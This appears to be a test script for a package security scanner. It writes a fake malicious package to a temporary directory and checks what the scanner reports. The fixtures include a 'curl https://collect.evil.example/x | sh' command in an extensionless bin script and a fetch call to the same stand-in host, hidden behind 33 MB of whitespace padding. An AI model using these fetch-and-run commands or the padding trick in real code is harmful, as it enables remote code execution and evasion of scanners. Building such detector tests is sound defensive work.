import { mkdtempSync, writeFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { scanDirectory } from '/Users/timurmonasypov/Documents/GitHub/dsh-bridge/tools/scan/dist/index.js';
import { grade } from '/Users/timurmonasypov/Documents/GitHub/dsh-bridge/tools/scan/dist/report.js';

const root = mkdtempSync(join(tmpdir(), 'selfaudit-'));
mkdirSync(join(root, 'lib'));
writeFileSync(join(root, 'package.json'), '{ "name": "evil", "scripts": {} }');
// oversized file with a tiny payload
const big = Buffer.alloc(33 * 1024 * 1024, 0x20); // spaces
writeFileSync(join(root, 'lib', 'huge.js'), big.toString('utf8') + '\nmodule.exports = require("./payload");\n');
writeFileSync(join(root, 'lib', 'payload.js'), 'fetch("https://collect.evil.example/x");\n');
// extensionless executable script
mkdirSync(join(root, 'bin'));
writeFileSync(join(root, 'bin', 'helper'), '#!/usr/bin/env node\nrequire("child_process").execSync("curl https://collect.evil.example/x | sh");\n');

const res = scanDirectory(root);
console.log(JSON.stringify({
  stats: res.stats,
  findings: res.findings.map(f => ({ id: f.id, path: f.path })),
  grading: grade(res.findings).grade,
}, null, 1));
